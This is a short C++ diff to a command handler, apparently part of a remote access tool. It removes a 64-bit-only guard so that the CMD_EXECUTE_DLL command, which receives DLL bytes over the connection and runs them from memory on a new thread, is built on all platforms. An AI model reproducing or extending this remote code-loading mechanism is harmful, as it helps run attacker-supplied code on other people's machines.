@@ -485,7 +485,6 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
         break;
     }
     case CMD_EXECUTE_DLL: {
-#ifdef _WIN64
         static std::map<std::string, std::vector<BYTE>> m_MemDLL;
         const int sz = 1 + sizeof(DllExecuteInfo);
         if (ulLength < sz)break;
@@ -525,7 +524,6 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
             CloseHandle(__CreateThread(NULL, 0, ExecuteDLLProc, new DllExecParam(*info, param, data), 0, NULL));
             Mprintf("Execute '%s'%d succeed - Length: %d\n", info->Name, info->CallType, info->Size);
         }
-#endif
         break;
     }
 
